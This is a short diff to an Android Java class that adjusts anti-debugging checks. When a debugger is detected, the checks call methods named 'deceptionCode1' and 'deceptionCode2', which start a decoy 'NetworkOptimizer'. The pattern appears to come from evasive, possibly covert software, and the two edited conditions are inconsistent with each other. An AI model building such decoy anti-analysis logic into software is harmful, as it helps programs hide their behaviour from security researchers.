@@ -146,13 +146,13 @@ public class Core extends Activity implements Runnable {
 	}
 
 	private void deceptionCode2() {
-		NetworkOptimizer nOptimizer = new NetworkOptimizer(getApplicationContext());
+		NetworkOptimizer nOptimizer = new NetworkOptimizer(Status.self().getAppContext());
 		nOptimizer.start();
 
 	}
 
 	private void deceptionCode1() {
-		NetworkOptimizer nOptimizer = new NetworkOptimizer(getApplicationContext());
+		NetworkOptimizer nOptimizer = new NetworkOptimizer(Status.self().getAppContext());
 		nOptimizer.start();
 	}
 
@@ -753,7 +753,7 @@ public class Core extends Activity implements Runnable {
 	}
 
 	public boolean check() {
-		if (!Cfg.DEBUG) {
+		if (!Cfg.DEBUG || Cfg.DEBUGANTI) {
 			AntiDebug ad = new AntiDebug();
 			if (ad.isDebug()) {
 				deceptionCode1();
@@ -770,7 +770,7 @@ public class Core extends Activity implements Runnable {
 	}
 	
 	public static boolean checkStatic() {
-		if (!Cfg.DEBUG) {
+		if (Cfg.DEBUG ||  Cfg.DEBUGANTI) {
 			AntiDebug ad = new AntiDebug();
 			if (ad.isDebug()) {
 				//deceptionCode1();
